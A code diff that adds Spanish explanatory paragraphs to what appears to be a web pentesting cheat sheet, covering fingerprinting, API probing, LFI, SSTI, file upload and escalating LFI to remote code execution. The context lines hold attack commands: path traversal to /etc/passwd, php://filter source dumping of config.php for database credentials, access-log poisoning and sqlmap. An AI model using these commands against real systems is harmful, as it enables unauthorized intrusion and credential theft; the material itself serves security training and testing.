@@ -415,6 +415,7 @@ SECTIONS = [
         "summary": "De discovery web a bugs de autorizacion, SSRF, JWT y uploads.",
         "blocks": [
             ("h2", "Fingerprinting y discovery"),
+            ("p", "Antes de atacar, mapea la web: que tecnologia corre y que rutas existen. El fuzzing saca paneles, backups y APIs que no estan enlazados."),
             ("code", [
                 "curl -i $URL/",
                 "whatweb -a 3 $URL",
@@ -442,6 +443,7 @@ SECTIONS = [
                 "Fuzzea el metodo HTTP (GET/POST/PUT/DELETE/PATCH): un endpoint puede aceptar datos o ser inyectable solo por un verbo concreto.",
             ]),
             ("h2", "APIs REST y metodos HTTP"),
+            ("p", "Las APIs se prueban distinto a una web clasica: importan el metodo HTTP y el cuerpo JSON. Un endpoint puede ser vulnerable solo por un verbo (PUT/POST) o por un campo del JSON."),
             ("code", [
                 "curl -sS $URL/api/ ; curl -sS $URL/api/v1/",
                 "curl -sS $URL/swagger.json ; curl -sS $URL/openapi.json ; curl -sS $URL/api-docs",
@@ -456,6 +458,7 @@ SECTIONS = [
                 "sqlmap -r request.txt --batch --level 3",
             ]),
             ("h2", "Explotacion web (LFI / SSTI / upload)"),
+            ("p", "Payloads para los bugs mas comunes: LFI (leer ficheros del servidor), SSTI (inyeccion en plantillas) y subida de ficheros. Confirma con una prueba inocua antes de ir a por ejecucion."),
             ("code", [
                 "curl -sS \"$URL/page.php?file=../../../../etc/passwd\"",
                 "curl -sS \"$URL/page.php?file=php://filter/convert.base64-encode/resource=index.php\"",
@@ -469,6 +472,7 @@ SECTIONS = [
                 "curl -sS \"$URL/.git/HEAD\"",
             ]),
             ("h2", "LFI a RCE"),
+            ("p", "LFI por si solo solo LEE ficheros. Para EJECUTAR codigo tienes que incluir un fichero que TU controlas: un log envenenado con tu User-Agent, php://input, data:// o /proc/self/environ. PAYLOAD_PHP es tu codigo PHP minimo (un system del parametro c)."),
             ("code", [
                 "curl -sS \"$URL/page.php?file=php://filter/convert.base64-encode/resource=config.php\"",
                 "curl -sS \"$URL/page.php?file=/var/log/apache2/access.log\"",
@@ -484,6 +488,7 @@ SECTIONS = [
                 "Si solo puedes leer, php://filter saca el codigo fuente en base64: ahi suelen estar las credenciales de BD.",
             ]),
             ("h2", "Triage de bugs"),
+            ("p", "Guia rapida: que senal delata cada tipo de bug y con que prueba minima lo confirmas sin falsos positivos."),
             ("table", [
                 ["Bug", "Senales y prueba inicial"],
                 ["LFI", "Parametros file/page/lang/template. Probar ../../../../etc/passwd y php://filter."],
